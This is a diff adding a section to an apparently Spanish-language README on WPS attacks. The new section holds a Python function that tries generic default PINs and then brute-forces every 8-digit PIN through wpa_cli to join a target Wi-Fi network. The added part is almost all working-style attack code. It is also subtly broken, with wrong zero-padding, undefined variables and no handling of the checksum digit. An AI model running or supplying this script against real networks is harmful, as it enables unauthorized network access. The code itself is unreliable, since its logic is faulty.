@@ -407,6 +407,42 @@ Y luego va `capturando` y `enviando` paquetes como se muestra en la foto de la e
 
 Ya luego continua con la secuencia de paquetes para conectarse a la red y `extrae la contraseña del paquete M8`. 
 
+## FUERZA BRUTA Y PINS GENÉRICOS
+
+```py
+def brute_force_WPS(target, conected):
+    checker2 = str('b"Selected interface ' + "'" + iface + "'" + r'\nFAIL\n"')
+    
+    generic_pins = ("00000000", "11111111", "12345670", "12349876", "98765432", "12345678")
+    print(colored("[+] ", 'green') + "Trying " + colored("generic PINS...", 'green'))
+    
+    for i in range(len(generic_pins)):
+        checkGconect = str(subprocess.check_output(["wpa_cli", "wps_pin", generic_pins[i], target]))
+        if checkGconect != checker2:
+            call(["wpa_cli", "wps_pin", generic_pins[i], target])
+            print(colored("[+] CONECTED! ", 'green') + "PIN: " + colored(generic_pins[i], 'cyan'))
+            conected = True
+            break
+
+    if conected == False:
+        print(colored("[+] ", 'green'), "Starging brute force...")
+        for i in range(0,99999999):
+            rawPIN = str(i)
+            OtoAdd = int(8 - len(rawPIN))
+            pin = str(rawPIN.zfill(OtoAdd)) 
+            checkBFconect = str(subprocess.check_output(["wpa_cli", "wps_pin", pin, target]))
+            if checkBFconect != checker2:
+                call(["wpa_cli", "wps_pin", pin, target], stdout=DN, stderr=DN)
+                print(colored("[+] CONECTED! ", 'green') + "PIN: " + colored(pin, 'cyan'))
+                conected = True
+                return(pin)
+                break
+    
+    if conected == False:
+        print(colored("[!] Unable to connect to this network! ", 'red') + colored("The network is ", 'yellow') + colored("secure ", 'green') + colored("against ", 'yellow') + colored("WPS ", 'red') + colored("attacks!", 'yellow'))
+        return("NOPE")
+```
+
 
 
 
